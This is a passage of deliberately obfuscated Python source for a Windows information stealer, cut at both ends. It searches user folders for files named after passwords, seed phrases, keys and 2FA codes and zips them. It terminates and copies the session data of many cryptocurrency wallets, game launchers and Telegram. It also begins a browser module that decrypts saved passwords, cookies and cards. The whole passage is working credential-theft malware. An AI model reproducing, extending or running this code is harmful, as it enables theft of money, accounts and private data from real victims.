                            .replace(r"%IP_PUBLIC%", TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB)
                            .replace(r"%EMBED_NAME%", DYCLPVZVUXQZMUOIBAUSSULIRLVZOWGVYADYFCIGSABCFCMCGYZGCQKLGBHTYGHWGEYCLIMBFFYUALNLRIPVNAEDWGUKEEKNN)
                            .replace(r"%EMBED_ICON%", BSPTFRPFLBSHSCGICJFUGTCGBYTROBQVURMKJDDNLZTWPTHPWAUWOJRHHAWYIRIXMYLHCCSZ)
                            .replace(r"%FOOTER_TEXT%", OYGHCENDOVBGZZPQOHTFAZDNQOCNCUKDCLRKGNEEFNNCFXFZDNVBSHEBDPEVUICBHDTJXBXS)
                            .replace(r"%WEBSITE%", EUZBVERWILCTPCTIDHEFNUXXHZEFOWPXVBQJHXFPQLSMTGHOODFOET))
                MCDHJLCDTNMJOCDGTCFKCOYJMDMWDXOCZJAEOIBXTETEZAWSPTYDLORPKIIAEAQFXPCDYXGZAOBAEMKJIY(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC)
                
    CWPRPCLZLZUZILCFYODXSBWDQQVHWLWLGWEVZNZHZUVUHKHNNHPFRZZCNXOHSQRY()
    return PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN

def UHSLYCXNYLGFBAJHTERZRJUVRARPNLYGSKMATUDPHMCSJCYDVSSZLGQLRAVZ(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import os
    import random

    PHXSUJEVAVIYWUZLBJCWSDLWUDFETJMFAJTVFAEQHOPPWBZTRQGQXEPMXVYIBWIEJIN = [
        os.path.join(QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX, "Desktop"),
        os.path.join(QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX, "Downloads"),
        os.path.join(QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX, "Documents"),
        os.path.join(QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX, "Picture"),
        os.path.join(QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX, "Video"),
        os.path.join(QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX, "OneDrive"),
        os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA, "Microsoft", "Windows", "Recent")
    ]

    GWRRHPNSIBDVSQQCWTCBYJKFZNBEJRINTCHPSGKAQQBZKBKVMOHZLPSJEMOwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON_files = []

    for BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ in PHXSUJEVAVIYWUZLBJCWSDLWUDFETJMFAJTVFAEQHOPPWBZTRQGQXEPMXVYIBWIEJIN:
        for v4r_root, SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIECs, v4r_files in os.walk(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        ERQOQZYDJUDNXRRWDKZTRCARLOUTITBSCRVOVUWCSMDIHMZRWF = os.path.splitext(v4r_file)[0].lower()
                        for GWRRHPNSIBDVSQQCWTCBYJKFZNBEJRINTCHPSGKAQQBZKBKVMOHZLPSJEMOword in GWRRHPNSIBDVSQQCWTCBYJKFZNBEJRINTCHPSGKAQQBZKBKVMOHZLPSJEMOwords:
                            try:
                                if GWRRHPNSIBDVSQQCWTCBYJKFZNBEJRINTCHPSGKAQQBZKBKVMOHZLPSJEMOword.lower() == ERQOQZYDJUDNXRRWDKZTRCARLOUTITBSCRVOVUWCSMDIHMZRWF:
                                    NSYOOEETOCBVVAVURTEBJXPCJYMDDJQBOPKGYBHZRSIWRUIPUTHXXLYZKGGAQWETSKEUVQYSRWBSQQPDEIPGVXOKBNQDHUISKQ = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(NSYOOEETOCBVVAVURTEBJXPCJYMDDJQBOPKGYBHZRSIWRUIPUTHXXLYZKGGAQWETSKEUVQYSRWBSQQPDEIPGVXOKBNQDHUISKQ):
                                        GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(NSYOOEETOCBVVAVURTEBJXPCJYMDDJQBOPKGYBHZRSIWRUIPUTHXXLYZKGGAQWETSKEUVQYSRWBSQQPDEIPGVXOKBNQDHUISKQ, "rb") as v4r_f:
                                            DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON_files:
        AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN = sum(len(phrase.split()) for phrase in GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON_files)
    else:
        AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN = 0

    return AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN

def UWRWVRVIEVCJSSKSVCVTWCRGINPNEHAIRBFWCQBMJDNQSHJTTFDMEZFZWXMJ(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import os
    import psutil

    JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ = ["Wallets", "Game Launchers", "Apps"]
    HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF         = [] if "Wallets" in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ else None
    QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN  = [] if "Game Launchers" in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ else None
    QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK            = [] if "Apps" in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ else None

    LYYJRKSFVTPGZNVFSGICZNVJSLRBVGJKNECSDUKNAGXKGPESZQGTRUASEAGHZJKBCJOUGRNYQHWNOELWQGNMOVAUNBPIQ = [
        ("Zcash",             os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(GFUVEDUYCCTPMTRZJAOAIPUDHCRLTRZWOITDHFLWTMDINEHFPZPRYZBQQOATADJADUAQJWKC, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_proc_name, v4r_type in LYYJRKSFVTPGZNVFSGICZNVJSLRBVGJKNECSDUKNAGXKGPESZQGTRUASEAGHZJKBCJOUGRNYQHWNOELWQGNMOVAUNBPIQ:
            if v4r_type in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, v4r_proc_name, v4r_type in LYYJRKSFVTPGZNVFSGICZNVJSLRBVGJKNECSDUKNAGXKGPESZQGTRUASEAGHZJKBCJOUGRNYQHWNOELWQGNMOVAUNBPIQ:
        if v4r_type in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ and os.path.exists(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
            try:
                if v4r_type == "Wallets" and HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF is not None:
                    HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF.append(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON)
                elif v4r_type == "Game Launchers" and QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN is not None:
                    QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN.append(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON)
                elif v4r_type == "Apps" and QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK is not None:
                    QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK.append(GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON)

                DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(os.path.join("Session Files", GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, "path.txt"), BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ)

                if os.path.isdir(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
                    for v4r_root, _, v4r_files in os.walk(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ):
                        for v4r_file in v4r_files:
                            VYBRGKGFOYTQNQMRPRSSXWGDCOSNBXZPLEACGLUNLEORMXJTNXGEWXXV = os.path.join(v4r_root, v4r_file)
                            XOQBVNYDWFNLCUVOWTFZUEBZURLMREAVTNLQDQMWWFQFEVYNDU = os.path.join(
                                "Session Files", GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, "Files",
                                os.path.relpath(VYBRGKGFOYTQNQMRPRSSXWGDCOSNBXZPLEACGLUNLEORMXJTNXGEWXXV, BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ)
                            )
                            try:
                                DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.write(VYBRGKGFOYTQNQMRPRSSXWGDCOSNBXZPLEACGLUNLEORMXJTNXGEWXXV, XOQBVNYDWFNLCUVOWTFZUEBZURLMREAVTNLQDQMWWFQFEVYNDU)
                            except:
                                pass
                else:
                    XOQBVNYDWFNLCUVOWTFZUEBZURLMREAVTNLQDQMWWFQFEVYNDU = os.path.join("Session Files", GWJMVGJNKPFBVAFVPYBHODQPBGWSROODSRDCBCGTHCBVIEYGWSKGMYIXVVDLON, "Files", os.path.basename(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ))
                    try:
                        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.write(BAVGGPAIVSZHTNTSCTVJSLFTOWWFURIVVVFTCPTSPDWJUZVIUXBYMVRXFHIDREUXZLFCLWHZDZVHTYCEFPAUWXPQCUQ, XOQBVNYDWFNLCUVOWTFZUEBZURLMREAVTNLQDQMWWFQFEVYNDU)
                    except:
                        pass
            except:
                pass

    if "Wallets" in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ:
        HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF = ", ".join(HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF) if HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF else "No"
    if "Game Launchers" in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ:
        QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN = ", ".join(QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN) if QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN else "No"
    if "Apps" in JKJHTIZWIPTCZPONJDGGAGEWHOYZHAMCOFIJIPVQEHIWXPVAOOVEYVNTBETNZNXGZ:
        QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK = ", ".join(QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK) if QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK else "No"

    return HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF, QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN, QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK

def BUSAMIABSZBVKTIGXQVLAEDWFNJLQZBZTGOGAXCALUEHYJIKSGFNLTQMYFVZIKMUPB(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX, FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD, VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU, UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS, NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT, ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE

    OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    OAGPVBKAUAIPTVDECBYEQJPDSWQWYYPVWPEIYZAIBIQEPDFQPCAZOZFDIFLUWDILT = []

    if "extentions" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX = 0
    else:
        DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX = None

    if "passwords" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT = []
        FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD = 0
    else:
        BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT = ""
        FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD = None
    if "cookies" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW = []
        VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU = 0
    else:
        MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW = ""
        VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU = None
    if "history" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP = []
        UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS = 0
    else:
        LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP = ""
        UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS = None
    if "downloads" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
